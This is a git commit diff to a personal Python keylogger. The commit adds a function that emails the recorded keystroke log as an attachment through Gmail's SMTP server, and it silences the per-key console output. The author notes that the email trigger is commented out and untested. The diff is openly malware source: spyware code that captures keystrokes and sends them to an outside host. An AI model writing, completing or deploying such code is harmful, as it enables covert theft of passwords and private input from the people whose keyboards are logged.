4d26962750ca1597790270d1d385461e28f3741f
Lachezar <31971186+Todorov-Lachezar@users.noreply.github.com>
2021-09-21 23:19:10 -0400

    Added email capability
    Added email functionality which sends the log file to a specified email. It is not tested as I couldn't find a way to do it without providing the password to my email in the document or having the Keylogger pick it up and record it through input().

--- Keylogger/keylogger.py
+++ Keylogger/keylogger.py
@@ -2,6 +2,15 @@ import pynput
 
 from pynput.keyboard import Key, Listener
 
+
+import email, smtplib, ssl
+
+from email import encoders
+from email.mime.base import MIMEBase
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+
+
 # initialization variables
 count = 0 # standard counter
 keys = [] # a list that will store the key inputs
@@ -17,7 +26,7 @@ def on_press(key):
     # key was pressed
     keys.append(key)
     count += 1
-    print(" {0} pressed ".format(key))
+    #print(" {0} pressed ".format(key))
 
     # when the count is greater than or equal to 5
     # reset the count, write to the text file, and
@@ -27,7 +36,14 @@ def on_press(key):
         write_file(keys)
         keys = []
 
-# fucntion that writes the key list to the output file
+    # Calls the email function when an esc key is pressed.
+    # This was commented out because I wasn't able to figure 
+    # out a way to do it without either hardcoding my password
+    # or for the Keylogger to record my password. 
+    #if key == Key.esc:
+    #    email()
+
+# function that writes the key list to the output file
 def write_file(keys):
     with open("log.txt", "a") as f: # w = write, a = add?
         for key in keys:
@@ -41,16 +57,60 @@ def write_file(keys):
                 f.write("\n")
             # Keylogger recognizes uppercase characters so having
             # the shift in the output file is unecessary
-            elif key == Key.shift:
+            elif key == Key.shift or key == Key.shift_r:
                 continue
             else:
                 f.write(k + " ")
-
 
 # Should exit the program when an Esc key is pressed
 def on_release(key):
     if key == Key.esc:
         return False
+
+def email() :
+    subject = "An email with attachment from Python"
+    body = "This is an email with attachment sent from Python"
+    sender_email = input("Enter your email that you will send the file from: ")
+    receiver_email = input("Enter the email that you will send the file to: ")
+    password = input("Enter the password to your email: ")
+
+    # Create a multipart message and set headers
+    message = MIMEMultipart()
+    message["From"] = sender_email
+    message["To"] = receiver_email
+    message["Subject"] = subject
+    message["Bcc"] = receiver_email  # Recommended for mass emails
+    # Add body to email
+    message.attach(MIMEText(body, "plain"))
+
+    filename = "log.txt"  # In same directory as script
+
+    # Open PDF file in binary mode
+    with open(filename, "rb") as attachment:
+        # Add file as application/octet-stream
+        # Email client can usually download this automatically as attachment
+        part = MIMEBase("application", "octet-stream")
+        part.set_payload(attachment.read())
+
+    # Encode file in ASCII characters to send by email    
+    encoders.encode_base64(part)
+
+    # Add header as key/value pair to attachment part
+    part.add_header(
+        "Content-Disposition",
+        f"attachment; filename= {filename}",
+    )
+
+    # Add attachment to message and convert message to string
+    message.attach(part)
+    text = message.as_string()
+
+    # Log in to server using secure context and send email
+    context = ssl.create_default_context()
+    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
+        server.login(sender_email, password)
+        server.sendmail(sender_email, receiver_email, text)
+    
 
 # Listens in on the keyboard inputs and executes the functions 
 # on_press and on_release when a key is pressed
